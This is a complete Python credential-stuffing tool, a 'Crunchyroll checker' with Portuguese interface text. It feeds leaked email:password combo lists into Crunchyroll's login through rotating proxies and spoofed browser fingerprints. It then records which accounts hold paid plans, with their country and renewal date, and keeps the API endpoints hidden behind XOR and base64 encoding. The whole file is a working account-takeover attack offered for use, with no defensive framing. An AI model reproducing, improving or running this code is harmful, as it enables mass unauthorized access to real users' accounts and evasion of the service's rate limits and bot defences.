import os, re, sys, time, uuid, random, threading, json, hashlib, base64
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import filedialog

import requests, urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

try:
    from curl_cffi import requests as curl_requests
    CURL_OK = True
except ImportError:
    CURL_OK = False


def _f(h):
    r = []
    a, b = 0, 1
    for v in bytes.fromhex(h):
        r.append(chr(v ^ (a & 0xFF)))
        a, b = b, a + b
    return "".join(r)


_X4  = "68757572703f272266515877f39b0c0cb855612702ae43df437e5c6d12c541f2698d80a0de"
_X5  = "68757572703f272262554077f39b0c0cb855612702ae43df437e5c6d12c05cb52a94d6e6c41642c7a5"
_X6  = "68757572703f272277474338bd88090bf55e6a2003a14788527e5d2e5dd647b02a8384aadf0c47d6b8424e94f2ef3a"
_X8  = "68757572392a276c654b1930e0801f1bf5526a32"

WEB_BASIC = base64.b64decode("Ym05aGFXaGtaWFp0WHpacGVXY3dZVGhzTUhFNg==").decode("utf-8")
CNN = base64.b64decode("U3Byb2plY3RjaGFubmVs").decode("utf-8")

USER_AGENTS = [
    "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "Crunchyroll/3.80.1 Android/11 okhttp/4.12.0",
    "Crunchyroll/ANDROIDTV/3.80.0_22374 (Android 14; es-ES; SHG07)",
    "Crunchyroll/3.82.0 Android/13 okhttp/4.12.0",
]

BANNER_ART = """
 ██████╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗██╗   ██╗██████╗  ██████╗ ██╗     ██╗     
██╔════╝██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║╚██╗ ██╔╝██╔══██╗██╔═══██╗██║     ██║     
██║     ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║ ╚████╔╝ ██████╔╝██║   ██║██║     ██║     
██║     ██╔══██║██║   ██║██║╚██╗██║██║     ██╔══██║  ╚██╔╝  ██╔══██╗██║   ██║██║     ██║     
╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║   ██║   ██║  ██║╚██████╔╝███████╗███████╗
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
                                                                                             """

PLAN_MAP = {"streams.4": "MEGA FAN", "streams.1": "FAN", "streams.6": "ULTIMATE FAN"}

TIMEOUT              = 20
PROXY_BAN_SECONDS    = 600
PROXY_BAN_THRESHOLD  = 3
MAX_PROXY_RETRIES    = 8
RETRY_SLEEP_MIN      = 0.5
RETRY_SLEEP_MAX      = 1.5
POOL_DEAD_THRESHOLD  = 3

RESULTS_DIR = os.path.join("results", "CRUNCHYROLL")
os.makedirs(RESULTS_DIR, exist_ok=True)

HITS_FILE      = os.path.join(RESULTS_DIR, "hits.txt")
FREE_FILE      = os.path.join(RESULTS_DIR, "free.txt")
TWOFA_FILE     = os.path.join(RESULTS_DIR, "2fa.txt")
LOCKED_FILE    = os.path.join(RESULTS_DIR, "locked.txt")
INVALID_FILE   = os.path.join(RESULTS_DIR, "invalid.txt")

COUNTRY_NAMES = {
    "US": "United States", "GB": "United Kingdom", "UK": "United Kingdom",
    "CA": "Canada", "AU": "Australia", "NZ": "New Zealand",
    "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain",
    "PT": "Portugal", "NL": "Netherlands", "BE": "Belgium", "CH": "Switzerland",
    "AT": "Austria", "SE": "Sweden", "NO": "Norway", "DK": "Denmark",
    "FI": "Finland", "IE": "Ireland", "PL": "Poland", "CZ": "Czechia",
    "GR": "Greece", "TR": "Turkey", "RU": "Russia", "UA": "Ukraine",
    "RO": "Romania", "HU": "Hungary", "BG": "Bulgaria", "HR": "Croatia",
    "SK": "Slovakia", "SI": "Slovenia", "RS": "Serbia", "LT": "Lithuania",
    "LV": "Latvia", "EE": "Estonia", "IS": "Iceland", "LU": "Luxembourg",
    "MT": "Malta", "CY": "Cyprus",
    "BR": "Brazil", "MX": "Mexico", "AR": "Argentina", "CL": "Chile",
    "CO": "Colombia", "PE": "Peru", "VE": "Venezuela", "EC": "Ecuador",
    "UY": "Uruguay", "PY": "Paraguay", "BO": "Bolivia", "CR": "Costa Rica",
    "PA": "Panama", "GT": "Guatemala", "HN": "Honduras", "SV": "El Salvador",
    "NI": "Nicaragua", "DO": "Dominican Republic", "CU": "Cuba", "JM": "Jamaica",
    "TT": "Trinidad and Tobago",
    "IN": "India", "PK": "Pakistan", "BD": "Bangladesh", "LK": "Sri Lanka",
    "NP": "Nepal", "BT": "Bhutan", "MV": "Maldives", "AF": "Afghanistan",
    "CN": "China", "JP": "Japan", "KR": "South Korea", "KP": "North Korea",
    "TW": "Taiwan", "HK": "Hong Kong", "MO": "Macau", "SG": "Singapore",
    "MY": "Malaysia", "ID": "Indonesia", "TH": "Thailand", "VN": "Vietnam",
    "PH": "Philippines", "KH": "Cambodia", "LA": "Laos", "MM": "Myanmar",
    "BN": "Brunei", "MN": "Mongolia",
    "AE": "United Arab Emirates", "SA": "Saudi Arabia", "QA": "Qatar",
    "KW": "Kuwait", "BH": "Bahrain", "OM": "Oman", "YE": "Yemen",
    "IQ": "Iraq", "IR": "Iran", "IL": "Israel", "JO": "Jordan",
    "LB": "Lebanon", "SY": "Syria", "PS": "Palestine",
    "EG": "Egypt", "MA": "Morocco", "DZ": "Algeria", "TN": "Tunisia",
    "LY": "Libya", "SD": "Sudan", "ET": "Ethiopia", "KE": "Kenya",
    "NG": "Nigeria", "GH": "Ghana", "ZA": "South Africa", "TZ": "Tanzania",
    "UG": "Uganda", "RW": "Rwanda", "SN": "Senegal", "CI": "Ivory Coast",
    "CM": "Cameroon", "ZW": "Zimbabwe", "ZM": "Zambia", "AO": "Angola",
    "MZ": "Mozambique", "MG": "Madagascar", "MU": "Mauritius",
}

_USE_COLOR = sys.stdout.isatty() or os.environ.get("TERM") in (
    "xterm", "xterm-256color", "screen")

if _USE_COLOR:
    RST    = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    GREEN  = "\033[38;5;46m"
    LGREEN = "\033[38;5;120m"
    RED    = "\033[38;5;203m"
    YEL    = "\033[38;5;220m"
    CYAN   = "\033[38;5;51m"
    MAG    = "\033[38;5;213m"
    GREY   = "\033[38;5;245m"
else:
    RST = BOLD = DIM = GREEN = LGREEN = RED = YEL = CYAN = MAG = GREY = ""


def out_c(t, color):
    return f"{color}{t}{RST}"


def flag_emoji(code):
    if not code or len(code) != 2 or not code.isalpha():
        return "🏳"
    return "".join(chr(0x1F1E6 + ord(ch.upper()) - ord("A")) for ch in code)


def country_full(code):
    code = (code or "").strip().upper()
    if not code or code in ("N/A", "UNKNOWN", "??", "--", "-"):
        return "Unknown 🏳"
    if code in COUNTRY_NAMES:
        return f"{COUNTRY_NAMES[code]} {flag_emoji(code)}"
    return f"{code} {flag_emoji(code)}"


def rand_ua():
    return random.choice(USER_AGENTS)


def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        print("\n" * 3)


def banner():
    clear_screen()
    print(out_c(BANNER_ART, GREEN))
    print(out_c("=======================================================", GREEN))
    print(out_c(" >>> CRUNCHYROLL CHECKER", LGREEN))
    print(out_c(f" Channel: {CNN}", CYAN))
    print(out_c("=======================================================", GREEN) + "\n")
    if not CURL_OK:
        print(out_c("  [!] curl-cffi não instalado — cloudflare pode bloquear requisições", YEL))
        print(out_c("      correção: pip install curl-cffi", YEL))
        print()


def ask(prompt, default=None):
    shown = out_c(prompt, LGREEN)
    if default is not None:
        shown += out_c(f" [{default}]", GREY)
    shown += out_c(" : ", GREEN)
    try:
        val = input("  " + shown).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)
    return val if val else default


def select_db_file():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    file_path = filedialog.askopenfilename(
        title="[SELECT COMBO]",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    root.destroy()
    return file_path


class TopStatus:
    NROWS = 5
    W     = 64

    def __init__(self, total, proxies_count):
        self.total = total
        self.proxies_count = proxies_count
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.twofa = 0
        self.locked = 0
        self.bad = 0
        self.err = 0
        self.emitted = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self.enabled = sys.stdout.isatty()

    def _rows(self):
        el = time.time() - self.start
        cps = self.checked / max(el, 1e-3)

        l1_parts = [
            ("checked ", GREY), (f"{self.checked}/{self.total}", LGREEN),
            ("   hits ", GREY), (str(self.hits), GREEN),
            ("   free ", GREY), (str(self.free), CYAN),
            ("   locked ", GREY), (str(self.locked), YEL),
        ]
        l1_plain = "".join(p[0] for p in l1_parts)
        l1_col   = "".join(out_c(p[0], p[1]) for p in l1_parts)

        l2_parts = [
            ("2fa ", GREY), (str(self.twofa), MAG),
            ("   bad ", GREY), (str(self.bad), RED),
            ("   err ", GREY), (str(self.err), YEL),
            ("   speed ", GREY), (f"{cps:.1f}/s", LGREEN),
            ("   time ", GREY), (f"{int(el)}s", LGREEN),
        ]
        l2_plain = "".join(p[0] for p in l2_parts)
        l2_col   = "".join(out_c(p[0], p[1]) for p in l2_parts)

        W = self.W

        def row(plain, col):
            pad = max(0, W - len(plain))
            return out_c("  │ ", GREY) + col + " " * pad + out_c(" │", GREY)

        return [
            out_c("  ╭─ live " + "─" * (W - 5) + "╮", GREY),
            row(l1_plain, l1_col),
            row(l2_plain, l2_col),
            out_c("  ╰" + "─" * (W + 2) + "╯", GREY),
            "",
        ]

    def draw_initial(self):
        if not self.enabled:
            return
        for r in self._rows():
            print(r)
        sys.stdout.flush()

    def _redraw(self):
        if not self.enabled:
            return
        up = self.NROWS + self.emitted
        sys.stdout.write(f"\033[{up}A")
        for r in self._rows():
            sys.stdout.write("\033[K" + r + "\n")
        if self.emitted > 0:
            sys.stdout.write(f"\033[{self.emitted}B")
        sys.stdout.flush()

    def bump(self, label):
        with self.lock:
            self.checked += 1
            if label == "HIT":        self.hits += 1
            elif label == "HIT_FREE": self.free += 1
            elif label == "2FA":      self.twofa += 1
            elif label == "LOCKED":   self.locked += 1
            elif label == "BAD":      self.bad += 1
            elif label in ("ERR", "THROTTLED", "MALFORMED"): self.err += 1
            self._redraw()

    def emit(self, text, color=None):
        with self.lock:
            line = out_c(text, color) if color else text
            print(line)
            self.emitted += 1
            self._redraw()


def parse_combo(combo):
    for d in (":", "|", ";"):
        if d in combo:
            a, _, b = combo.partition(d)
            return a.strip(), b.strip()
    return combo, ""


def norm_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if "://" in p:
        return p

    scheme = "http"
    if "@" in p:
        auth, _, hostport = p.rpartition("@")
        parts = hostport.split(":")
        if len(parts) >= 2 and parts[1] in ("1080", "9050", "10808"):
            scheme = "socks5"
        return f"{scheme}://{auth}@{hostport}"

    parts = p.split(":")
    if len(parts) == 2:
        host, port = parts
        if port in ("1080", "9050", "10808"):
            scheme = "socks5"
        return f"{scheme}://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pwd = parts
        if port in ("1080", "9050", "10808"):
            scheme = "socks5"
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    if len(parts) > 4:
        host, port, user = parts[0], parts[1], parts[2]
        pwd = ":".join(parts[3:])
        if port in ("1080", "9050", "10808"):
            scheme = "socks5"
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    return f"{scheme}://{p}"


class ProxyPool:
    def __init__(self, proxies):
        self.proxies = list(proxies)
        self._state = {}
        self._lock = threading.Lock()
        self._i = 0

    def next(self):
        if not self.proxies:
            return None, None
        now = time.time()
        n = len(self.proxies)
        with self._lock:
            for _ in range(n):
                p = self.proxies[self._i % n]
                self._i += 1
                st = self._state.get(p)
                if st and st["until"] > now:
                    continue
                return {"http": p, "https": p}, p
            p = self.proxies[self._i % n]
            self._i += 1
            return {"http": p, "https": p}, p

    def report_throttle(self, proxy):
        if not proxy:
            return
        with self._lock:
            st = self._state.setdefault(proxy, {"fails": 0, "until": 0.0})
            st["fails"] += 1
            if st["fails"] >= PROXY_BAN_THRESHOLD:
                st["until"] = time.time() + PROXY_BAN_SECONDS

    def report_success(self, proxy):
        if not proxy:
            return
        with self._lock:
            st = self._state.get(proxy)
            if st:
                st["fails"] = 0
                st["until"] = 0.0

    def healthy_count(self):
        now = time.time()
        with self._lock:
            return sum(1 for p in self.proxies
                       if (self._state.get(p) or {}).get("until", 0.0) <= now)

    def banned_count(self):
        return len(self.proxies) - self.healthy_count()


def load_proxies(path):
    out = []
    if not path or not os.path.exists(path):
        return out
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            np = norm_proxy(line)
            if np:
                out.append(np)
    return out


class ComboTracker:
    def __init__(self, source_path):
        self.remaining = set()
        with open(source_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    self.remaining.add(line)

    def snapshot(self):
        return list(self.remaining)

    def remove(self, line):
        pass

    def flush(self):
        pass


def make_session(proxy):
    if CURL_OK:
        try:
            s = curl_requests.Session(impersonate="safari_ios")
        except Exception:
            s = curl_requests.Session()
    else:
        s = requests.Session()
        retry = Retry(total=0, connect=0, read=0, status=0,
                      allowed_methods=frozenset(["GET", "POST"]))
        adapter = HTTPAdapter(max_retries=retry, pool_connections=64,
                              pool_maxsize=64, pool_block=False)
        s.mount("https://", adapter)
        s.mount("http://", adapter)

    if proxy:
        s.proxies = proxy
    try:
        s.verify = False
    except Exception:
        pass
    return s


def req(session, method, url, **kw):
    try:
        return session.request(method, url, timeout=TIMEOUT, **kw), None
    except requests.exceptions.ProxyError as e:
        return None, f"proxy_dead:{str(e)[:60]}"
    except requests.exceptions.SSLError as e:
        return None, f"ssl:{str(e)[:60]}"
    except requests.exceptions.ConnectTimeout:
        return None, "connect_timeout"
    except requests.exceptions.ReadTimeout:
        return None, "read_timeout"
    except requests.exceptions.ConnectionError:
        return None, "conn_err"
    except Exception as e:
        return None, f"{type(e).__name__}:{str(e)[:60]}"


def get_cookie(session, name):
    try:
        v = session.cookies.get(name)
        if v:
            return v
    except Exception:
        pass
    try:
        d = session.cookies.get_dict()
        if name in d:
            return d[name]
    except Exception:
        pass
    try:
        for ck in session.cookies.jar:
            if ck.name == name:
                return ck.value
    except Exception:
        pass
    return None


def filter_proxies(proxies, threads=200):
    if not proxies:
        return []
    print(out_c(f"\n  ─── FILTERING {len(proxies)} PROXIES ───", GREEN))
    TEST_URL = _f(_X8)
    live, lock = [], threading.Lock()

    def test(proxy):
        try:
            r = requests.get(TEST_URL,
                proxies={"http": proxy, "https": proxy},
                timeout=8, verify=False,
                headers={"user-agent": rand_ua()})
            if r.status_code == 200 and len(r.text) < 50:
                with lock:
                    live.append(proxy)
                    if len(live) % 10 == 0:
                        print(out_c(f"  ✓ {len(live)} live...", LGREEN))
        except Exception:
            pass

    def worker(lst):
        for p in lst:
            test(p)

    chunks = [proxies[i::threads] for i in range(threads)]
    ts = [threading.Thread(target=worker, args=(ch,), daemon=True)
          for ch in chunks if ch]
    for t in ts: t.start()
    for t in ts: t.join()

    print(out_c(f"  → {len(live)}/{len(proxies)} live", LGREEN))
    return live


def do_check(email, password, proxy):
    sess = make_session(proxy)

    body_json = json.dumps({
        "email": email,
        "password": password,
        "recaptchaToken": "",
        "eventSettings": {},
    }, separators=(",", ":"))
    body_sha = hashlib.sha256(body_json.encode()).hexdigest()

    h1 = {
        "x-amz-content-sha256": body_sha,
        "sec-ch-ua-platform": '"Windows"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Microsoft Edge";v="156"',
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://sso.crunchyroll.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://sso.crunchyroll.com/login",
        "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    }

    r, err = req(sess, "POST",
                 _f(_X4),
                 headers=h1, data=body_json)
    if r is None:
        return ("error", f"sso:{err}")
    if r.status_code == 429 or "<!doctype html>" in r.text[:80].lower():
        return ("retry", "cf_429")

    src = r.text
    low = src.lower()

    if '"invalid_credentials"' in src:
        return ("invalid", None)
    if r.status_code == 401:
        return ("invalid", None)
    if "force_password_reset" in low:
        return ("2fa", None)
    if "too_many_requests" in low or "something_went_wrong" in low:
        return ("retry", "api_429")
    if r.status_code in (403,):
        return ("retry", "cf_403")
    if '"status":"ok"' not in src:
        return ("error", f"sso_unexpected:{src[:80]}")

    device_id = get_cookie(sess, "device_id")
    etp_rt    = get_cookie(sess, "etp_rt")
    if not device_id:
        return ("error", "no_device_id")

    h2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://www.crunchyroll.com/es-es/discover",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Basic {WEB_BASIC}",
        "ETP-Anonymous-Id": etp_rt or str(uuid.uuid4()),
        "Origin": "https://www.crunchyroll.com",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    token_body = (f"device_id={device_id}"
                  f"&device_type=Firefox%20on%20Windows"
                  f"&grant_type=etp_rt_cookie")

    r, err = req(sess, "POST",
                 _f(_X5),
                 headers=h2, data=token_body)
    if r is None:
        return ("error", f"tok:{err}")
    if r.status_code == 429 or "<!doctype html>" in r.text[:80].lower():
        return ("retry", "cf_429")

    m = re.search(r'"access_token":"([^"]+)"', r.text)
    if not m:
        if "invalid_grant" in r.text or r.status_code in (400, 401):
            return ("invalid", None)
        return ("error", f"tok_parse:{r.text[:80]}")
    token = m.group(1)

    m = re.search(r'"profile_id":"([^"]+)"', r.text)
    profile = m.group(1) if m else ""

    hme = {
        "User-Agent": "Crunchyroll/ANDROIDTV/3.80.0_22374 (Android 14; es-ES; SHG07)",
        "Authorization": f"Bearer {token}",
    }
    r, err = req(sess, "GET",
                 _f(_X6),
                 headers=hme)
    if r is None:
        return ("error", f"me:{err}")
    if '"has_password":false' in r.text:
        return ("2fa", None)
    if "account_locked" in r.text.lower() or "suspended" in r.text.lower():
        return ("locked", None)

    m = re.search(r'"external_id":"([^"]+)"', r.text)
    if not m:
        return ("error", "no_ext_id")
    ext = m.group(1)

    hb = {
        "Authorization": f"Bearer {token}",
        "X-datadog-sampling-priority": "0",
        "Etp-anonymous-id": str(uuid.uuid4()),
        "User-Agent": "Crunchyroll/ANDROIDTV/3.80.0_22374 (Android 14; es-ES; SHG07)",
    }
    r, err = req(sess, "GET",
                 f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{ext}/benefits",
                 headers=hb)
    if r is None:
        return ("error", f"ben:{err}")

    bsrc = r.text
    if ("subscription.not_found" in bsrc
            or "Subscription Not Found" in bsrc
            or r.status_code == 404
            or '"subscription_country":' not in bsrc):
        return ("free", {
            "sku": "-", "plan": "FREE",
            "country_code": "", "expiry": "N/A", "days": -1,
        })

    m = re.search(r'"benefit":"concurrent_([^"]+)"', bsrc)
    sub = m.group(1) if m else ""
    plan = PLAN_MAP.get(f"streams.{sub}", f"streams.{sub}" if sub else "?")

    r, _ = req(sess, "GET",
               f"https://beta-api.crunchyroll.com/subs/v4/accounts/{profile}/subscriptions",
               headers=hme)

    expiry, days, country = "N/A", -1, ""
    if r is not None:
        m = re.search(r'"nextRenewalDate":"([^"]+)"', r.text)
        if m:
            expiry = m.group(1).split("T")[0]
            try:
                days = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
            except Exception:
                pass
        m = re.search(r'"countryCode":"([^"]+)"', r.text)
        if m:
            country = m.group(1)

    if not country:
        m = re.search(r'"subscription_country":"([^"]+)"', bsrc)
        if m:
            country = m.group(1)

    return ("hit", {
        "sku": "-",
        "plan": plan,
        "country_code": country,
        "expiry": expiry,
        "days": days,
    })


def process(pool, combo, timeout):
    if ":" not in combo:
        return combo, "MALFORMED", {}

    email, password = parse_combo(combo)
    if not password:
        return combo, "MALFORMED", {}

    last_label, last_info = "ERR", {}
    for _attempt in range(MAX_PROXY_RETRIES):
        proxy_dict, proxy_id = pool.next()

        cat, info = do_check(email, password, proxy_dict)

        if cat == "hit":
            pool.report_success(proxy_id)
            return combo, "HIT", info
        if cat == "free":
            pool.report_success(proxy_id)
            return combo, "HIT_FREE", info
        if cat == "locked":
            pool.report_success(proxy_id)
            return combo, "LOCKED", {}
        if cat == "2fa":
            pool.report_success(proxy_id)
            return combo, "2FA", {}
        if cat == "invalid":
            pool.report_success(proxy_id)
            return combo, "BAD", {}

        pool.report_throttle(proxy_id)
        last_label, last_info = cat, info or {}
        time.sleep(random.uniform(RETRY_SLEEP_MIN, RETRY_SLEEP_MAX))

    if last_label == "retry":
        return combo, "THROTTLED", {}
    return combo, "ERR", {}


def hit_line(combo, info):
    return (
        f"{combo} | Country = {country_full(info.get('country_code', ''))} "
        f"| Plan = {info.get('plan', '?')} "
        f"| SKU = {info.get('sku', '-')} "
        f"| Expiry = {info.get('expiry', 'N/A')} "
        f"| Days = {info.get('days', -1)}"
    )


def main():
    global TIMEOUT

    banner()

    print(out_c("[*] Selecione a combo list...", LGREEN))
    combo_path = select_db_file()

    if not combo_path:
        print(out_c("[x] Ação abortada pelo usuário.", RED))
        return

    print(out_c(f"[+] Combo alvo: {combo_path}", GREEN))

    proxy_path = ask("proxy file (enter = direct / vpn)", default="")

    default_threads = "20" if (os.environ.get("TERMUX_VERSION") or "ANDROID_ROOT" in os.environ) else "50"
    t_raw = ask("threads", default=default_threads)
    try:
        threads = max(1, int(t_raw))
    except ValueError:
        threads = int(default_threads)

    tmo_raw = ask("timeout (min 10)", default=str(TIMEOUT))
    try:
        TIMEOUT = int(tmo_raw)
        if TIMEOUT < 10:
            TIMEOUT = 10
    except ValueError:
        TIMEOUT = 20

    tracker = ComboTracker(combo_path)
    combos = tracker.snapshot()
    if not combos:
        print(out_c("   ! no combos staged, exiting", RED))
        return

    proxies = []
    direct = True

    if proxy_path:
        raw_proxies = load_proxies(proxy_path)

        if not SOCKS_OK:
            pre = len(raw_proxies)
            raw_proxies = [p for p in raw_proxies if not p.startswith("socks")]
            if len(raw_proxies) < pre:
                print(out_c(f"  [!] {pre-len(raw_proxies)} socks5 skipped (pip install requests[socks])", YEL))

        if raw_proxies:
            filt_raw = ask("filter proxies? (1=yes 0=no)", default="1")
            try:
                filt = int(filt_raw)
            except ValueError:
                filt = 1

            if filt:
                raw_proxies = filter_proxies(raw_proxies)
                if not raw_proxies:
                    print(out_c("  [!] no live proxies — switching to DIRECT", YEL))
                else:
                    proxies = raw_proxies
                    direct = False
            else:
                proxies = raw_proxies
                direct = False

    pool = ProxyPool(proxies)

    print()
    print(out_c("  ┌──────────────────────────────────────────────┐", GREY))
    print(out_c("  │", GREY) + f"  combos  : {out_c(str(len(combos)), LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  │", GREY) + f"  threads : {out_c(str(threads), LGREEN):<34}" + out_c("│", GREY))
    mode = "direct / vpn" if direct else f"{len(proxies)} proxies"
    print(out_c("  │", GREY) + f"  proxy   : {out_c(mode, LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  └──────────────────────────────────────────────┘", GREY))
    print()

    status = TopStatus(total=len(combos), proxies_count=len(proxies))
    status.draw_initial()

    hits, checked, start = [], 0, time.time()

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(process, pool, combo, TIMEOUT): combo for combo in combos}
            for fut in as_completed(futures):
                combo, label, info = fut.result()
                checked += 1
                status.bump(label)

                if label == "HIT":
                    hits.append(combo)
                    line = hit_line(combo, info)
                    status.emit("  [HIT] " + line, LGREEN)
                    try:
                        with open(HITS_FILE, "a", encoding="utf-8") as out:
                            out.write(line + "\n")
                    except Exception:
                        pass
                elif label == "HIT_FREE":
                    line = hit_line(combo, info)
                    status.emit("  [FREE] " + line, CYAN)
                    try:
                        with open(FREE_FILE, "a", encoding="utf-8") as out:
                            out.write(line + "\n")
                    except Exception:
                        pass
                elif label == "2FA":
                    status.emit("  [2FA] " + combo, MAG)
                    try:
                        with open(TWOFA_FILE, "a", encoding="utf-8") as f:
                            f.write(combo + "\n")
                    except Exception:
                        pass
                elif label == "LOCKED":
                    status.emit("  [LOCKED] " + combo, YEL)
                    try:
                        with open(LOCKED_FILE, "a", encoding="utf-8") as f:
                            f.write(combo + "\n")
                    except Exception:
                        pass
                elif label == "BAD":
                    status.emit("  [BAD] " + combo, RED)
                    try:
                        with open(INVALID_FILE, "a", encoding="utf-8") as f:
                            f.write(combo + "\n")
                    except Exception:
                        pass

                if proxies and pool.healthy_count() < POOL_DEAD_THRESHOLD:
                    print()
                    print(out_c(f"  ⚠ pool exhausted — healthy {pool.healthy_count()}/{len(proxies)}.", YEL))
                    for f in futures:
                        f.cancel()
                    break
    finally:
        tracker.flush()

    elapsed = time.time() - start
    healthy = pool.healthy_count() if proxies else 0

    print("\n")
    print(out_c("  ╔══════════════════════════════════════════════╗", GREEN))
    def boxline(text, color=LGREEN, w=46):
        print(out_c("  ║", GREEN) + out_c(text.center(w), color) + out_c("║", GREEN))
    boxline(f"   DONE  ·  {len(hits)} hits  ·  {elapsed:.1f}s")
    boxline(f"   checked {checked}", GREY)
    boxline(f"   pool healthy {healthy}/{len(proxies) if proxies else 0}", GREY)
    boxline(f"   results saved to: results/CRUNCHYROLL/", GREY)
    print(out_c("  ╚══════════════════════════════════════════════╝", GREEN))
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(out_c("\n\n  stopped by user.\n", YEL))